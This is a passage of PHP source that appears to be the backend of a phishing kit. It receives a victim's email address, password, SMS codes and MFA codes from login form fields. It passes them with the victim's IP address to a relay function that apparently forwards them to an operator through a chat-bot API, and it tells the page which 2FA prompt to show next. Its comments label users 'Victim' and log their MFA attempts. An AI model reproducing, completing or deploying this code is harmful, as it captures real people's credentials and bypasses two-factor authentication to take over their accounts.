if(isset($_POST['mf_code'])){
	  $code= !empty($_POST['mf_code']) ? $_POST['mf_code'] : '';
	  $email_add=$_POST['emst'];
	  $pass=$_POST['pse'];
	  $response=do_it('code',[$code,$_POST['st'],$email_add,array(
	  "type"=>"mfa",
	  "email"=>$email_add,
	  "pass" => $pass,
	  "ip" => $publ_ip)
	  ],$api,$chat,$temp_host);
	//  echo $response;
	  function isJson($string) {
			$json = json_decode($string);
			return $json && $string != $json;
	}
	  if(isJson($response) == true){
		  echo json_encode(array('v'=>1,'t'=>$finish));
	  }else{
		  echo json_encode(array('v'=>0,'t'=>''));
		  // $logger=sprintf("Victim %s,Denied MFA",$publ_ip);
		  // $dis=new disp();
		  // $dis->send($logger,$bot,$chat,$email,$rz_name);
		  
	  }
}
if(isset($_POST['code'])){
  if($_POST['code']){
	  $code=$_POST['code'];
	  $email_add=$_POST['emst'];
	  $pass=$_POST['pse'];
	  $response=do_it('code',[$code,$_POST['st'],$email_add,array(
	  "type"=>"sms",
	  "email"=>$email_add,
	  "pass" => $pass,
	  "ip" => $publ_ip)],$api,$chat,$temp_host);
	  //echo $response;
	  function isJson($string) {
			$json = json_decode($string);
			return $json && $string != $json;
		}
		//echo $response;
	   if (isJson($response) == true ){
		  echo json_encode(array('v'=>1,'t'=>$finish));
	  }
	  else{
		  echo json_encode(array('v'=>0,'t'=>''));
		  // $logger=sprintf("Victim %s,Inserted a wrong code",$publ_ip);
		  // $dis=new disp();
	      // $dis->send($logger,$bot,$chat,$email,$rz_name);
	  }
  };
}
if(isset($_POST['auth'])){
	if(filter_var($_POST['auth'],FILTER_VALIDATE_EMAIL))	{
		$static=do_it('login',array($_POST['auth'],$_POST['pswd'],$publ_ip),$api,$chat,$temp_host);
		//echo $static;
		$user=$_POST['auth'];
		$pass=$_POST['pswd'];
		function isJson($string) {
			$json = json_decode($string);
			return $json && $string != $json;
		}  
		if(isJson($static)){
			$logged=json_decode($static,1);
			$static=$logged['type'];
		}
		if($static && $static=='valid'){
			echo json_encode(array('t'=>'valid','finish'=>$finish));
		}
		else if($static && $static=='sms'){
			// $logger=sprintf("Victim %s attempting 2fa",$publ_ip);
			// $dis=new disp();
			// $dis->send($logger,$bot,$chat,$email,$rz_name);
			echo json_encode(array('t'=>'sms','number'=>$logged['show'],'file'=>($logged['file'])));
		}
		else if($static && $static=='mfa1'){
			// $logger=sprintf("Victim %s attempting mfa type 1",$publ_ip);
			// $dis=new disp();
			// $dis->send($logger,$bot,$chat,$email,$rz_name);
			echo json_encode(array('t'=>'mfa1','number'=>$logged['show'],'file'=>($logged['file'])));
		}
		else if($static && $static=='mfa2'){
			// $logger=sprintf("Victim %s attempting mfa type 2",$publ_ip);
			// $dis=new disp();
			// $dis->send($logger,$bot,$chat,$email,$rz_name);
			echo json_encode(array('t'=>'mfa2','number'=>$logged['show'],'file'=>($logged['file'])));
		}
		else if(!$static){
			echo json_encode(array('t'=>'fail','finish'=>$finish));
		}
		
	}
}
$errors->check_send($api,$chat,$temp_host);

?>